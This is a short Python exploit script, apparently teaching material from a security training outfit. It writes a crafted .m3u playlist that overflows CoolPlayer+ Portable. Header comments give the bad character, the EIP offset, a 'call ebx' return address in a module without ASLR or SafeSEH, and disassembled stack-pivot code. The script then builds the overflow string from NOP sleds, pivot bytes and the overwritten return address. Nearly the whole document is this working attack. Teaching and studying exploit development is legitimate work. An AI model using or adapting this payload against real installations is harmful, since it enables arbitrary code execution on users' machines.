# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

# badchar for shellcode = '\x00'
#   0x00404ff5 : call ebx | startnull {PAGE_EXECUTE_READWRITE} [coolplayer+.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ptlabmachine\Desktop\CoolPlayer+Portable\App\CoolPlayer+\coolplayer+.exe)
# EIP offset: 230 - This offset is dependent on the location of .m3u file. In this module I have it on the Desktop
# E926010000 jmp $+299
#
# STACK PIVOTING CODE
#
# Save stack pointer
# 0156E08A   8BC4             	MOV EAX,ESP
#
# Carve out long jump
# 0156E08C   53                 PUSH EBX
# 0156E08D   5C                 POP ESP
# 0156E08E   83C4 40         	ADD ESP,40
# 0156E091   51                 PUSH ECX
# 0156E092   66:81C1 2601     	ADD CX,126
# 0156E097   66:51            	PUSH CX
# 0156E099   66:81C1 6AE8     	ADD CX,0E86A
# 0156E09E   66:51            	PUSH CX
#
# Restore stack
# 0156E2FA   50                 PUSH EAX
# 0156E2FB   5C                 POP ESP



filename = "martin-songs.m3u"

stackpivot = "\x8B\xc4\x53\x5c\x83\xc4\x40\x51\x66\x81\xC1\x26\x01\x66\x51\x66\x81\xC1\x6A\xE8\x66\x51"

evilString =  "\x90"*10 + stackpivot + "\x90"*198 + "\xf5\x4f\x40\x00" + "\x90"*200 + "\x50\x5c" + "\x90"*1436


file = open(filename,'w')
file.write(evilString)
file.close()